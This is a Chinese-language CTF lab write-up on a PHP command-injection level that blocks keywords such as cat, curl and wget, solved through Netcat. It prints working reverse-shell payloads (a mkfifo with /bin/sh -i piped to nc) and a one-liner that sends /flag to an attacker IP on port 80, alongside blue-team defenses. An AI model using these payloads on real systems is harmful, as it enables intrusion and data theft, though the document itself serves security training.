RCE-Labs Level 25 - nc 反弹 Shell 与端口受限穿透实战

2026年10月5日 RCE-Labs 反弹Shell 红队实战

一、题目信息

  • 题目名称：RCE-Labs Level 25 (nc 反弹 Shell)
  • 题目平台：RCE-Labs 靶场 (灵境平台部署)
  • 题目类型：Web安全 / 远程代码执行 (RCE) / 反弹 Shell / 内网穿透
  • 靶场链接：http://靶机IP:8080/less-25/
  • 涉及工具：浏览器、Burp Suite、Mac 终端 (Netcat)

二、解题步骤

1. 分析题目考什么

黑名单封禁了 cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|ping|curl|echo|wget。题目提示使用 nc 进行反弹 Shell。核心考点是让靶机主动将命令行控制权（Shell）反向移交给攻击机。

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|ping|curl|echo|wget/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

2. 怎么想（破题思路与层层踩坑）

反弹 Shell 的本质是让靶机作为“客户端”，通过 TCP 协议主动连接我们的 Mac（服务端），并将输入输出重定向到该连接。但在真实的内网/Docker 环境中，这一步充满荆棘。

3. 怎么解（极其详尽的四阶段踩坑实操记录）

阶段一：浏览器直接访问（失败）

尝试 Payload：?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.19 9002 >/tmp/f

失败响应：浏览器一直转圈打不开，甚至导致靶机 `about:blank` 卡死崩溃。

原因分析：1. 浏览器地址栏会破坏管道符 | 和重定向符 >；2. 缺少后台运行符 &，导致 PHP 的 system() 函数无限等待，耗尽进程池，靶机假死。

改进方式：换用 Burp Suite 发送原始请求，并尝试使用 & 让命令后台执行。

阶段二：Burp 发 9002 端口（失败）

尝试 Payload：?cmd=rm%20-f%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20192.168.1.19%209002%20%3E/tmp/f%20%26

失败响应：Burp 收到 200 OK，但 Mac 终端执行 nc -l -4 9002 毫无反应。

原因分析（三重坑）：1. macOS 的 nc 默认监听 IPv6，导致靶机 IPv4 连接找不到目标（需加 `-4`）；2. 靶机 Alpine 的 BusyBox nc 可能不支持复杂的管道和 `-i` 参数；3. Docker 网络策略很可能只允许 80/443 等标准 HTTP 端口出站，9002 这种高位端口被直接丢包。

改进方式：将监听端口改为靶机可以出站的 80 端口。

阶段三：Burp 发 80 端口（失败）

尝试 Payload：改为 80 端口后，Mac 终端执行 sudo nc -l -4 80。发送后终端依然无反应。

原因分析：虽然 80 端口是通的，但复杂的 mkfifo 管道命令在 BusyBox 精简版中容易执行失败，导致无法建立正确的双向 Shell 管道。

改进方式：放弃复杂的管道，简化 Payload，直接测试基础连通性。

阶段四：极简 Payload 直传 Flag（最终成功）

Mac 终端：sudo nc -l -4 80

最终成功 Payload：

?cmd=nc%20192.168.1.19%2080%20%3C%20/flag%20%26

逐字翻译与解析：

  • nc：Netcat，网络工具。
  • 192.168.1.19：攻击机 IP。
  • 80：攻击机监听端口（成功穿透的端口）。
  • <：输入重定向符。把 /flag 文件的内容，作为 nc 命令的标准输入（stdin）。
  • /flag：要读取的目标文件。
  • &：后台执行符。让命令在靶机后台运行，使 PHP 的 system() 函数立刻返回，Burp 可以收到 200 OK，且靶机不会卡死。

成功响应：Mac 终端瞬间接收到靶机发来的数据包，屏幕上打印出明文 flag{TEST_Dynamic_FLAG}！

4. 怎么迁移（跨学科与跨领域联想）

  • 红队内网穿透：在真实的护网中，防火墙通常只允许 80/443 等 Web 端口出站。红队常需要将 C2 服务伪装在 80/443 端口，或使用 DNS/ICMP 隧道来绕过端口限制。
  • IoT 僵尸网络：Mirai 等僵尸网络大量利用反弹 Shell 控制路由器、摄像头，组建庞大的 DDoS 攻击网络。

三、名词大全与原理深度复盘

1. 反弹 Shell (Reverse Shell) vs 正连接 (Bind Shell)

  • 正连接：攻击机连接靶机开放的端口。容易被防火墙入站规则拦截。
  • 反弹 Shell：靶机主动连接攻击机。由于防火墙通常对出站限制较松，成功率极高。

2. 输入重定向符 `<` 与 后台运行符 `&`

  • <：将右侧文件的内容作为左侧命令的标准输入。
  • &：将命令放入后台执行，不阻塞当前终端（或 PHP 进程）。这是防止靶机卡死的救命符。

3. 为什么 Docker 会阻断 9002 端口？

Docker 默认使用 NAT 网络，通常只允许容器主动访问外部 HTTP/HTTPS (80/443) 服务。当容器尝试向公网或宿主机发送非标准端口（如 9002）的 TCP 包时，可能会被 Docker 的 iptables 规则或宿主机的防火墙直接静默丢弃，导致反弹 Shell 失败。

四、题目思考

1. 这跟前面关卡的区别

前面关卡（Level 1-24）是在尝试各种方式“读取”或“写入”数据，属于单向数据传输。Level 25 尝试“获取控制权”，从单纯的数据窃取上升到了系统的交互式接管。

2. 这种题目的出现原因（底层逻辑与历史原因）

网络安全领域有一条默认规则：“内网出站流量往往比入站流量管理更宽松”。反弹 Shell 正是利用了这一历史遗留漏洞，让被控主机主动“打”出去，绕过了边界防御。

3. 这种漏洞在实际中的应用

在护网和 APT 攻击中，拿下 WebShell 后第一件事就是尝试反弹 Shell 以获得交互式终端。后续的提权、内网横向移动、安装 C2 后门等操作，都依赖这个稳定的 Shell 通道。

4. 如何抽象理解概念（大白话）

把靶机比作被关在密室里的人。正连接是你去敲门，但门被锁死（防火墙拦截入站）。反弹 Shell 是你丢给他一部手机（Payload），他主动给你打电话（出站连接）。电话接通后，你就可以通过电话指挥他做事了。你成功的关键是：**发现他只有 80 频道的手机信号，而且他要用扩音器（`< /flag`）把情报喊出来，而不是试图用复杂的手语（mkfifo 管道）交流**。

5. 他的本质

利用受控主机向攻击主机发起的双向 TCP 连接，并将标准输入、标准输出、标准错误全部重定向到该连接，实现远程交互式控制。

6. 如果我是出题人或者攻击者我会怎么防守或者破解

  • 防守方（蓝队）：限制服务器出站流量（只允许访问业务必需的白名单）；部署全流量审计设备，监测异常的 TCP 长连接；使用 EDR 监控 Web 进程是否创建了 /bin/sh 子进程。
  • 破解方（红队）：如果反弹 Shell 被拦截，尝试使用 DNS 隧道或 ICMP 隧道外带数据；使用加密的 C2 通道伪装流量；如果彻底无法出网，退而求其次，直接写入内存马或 WebShell 长期潜伏。
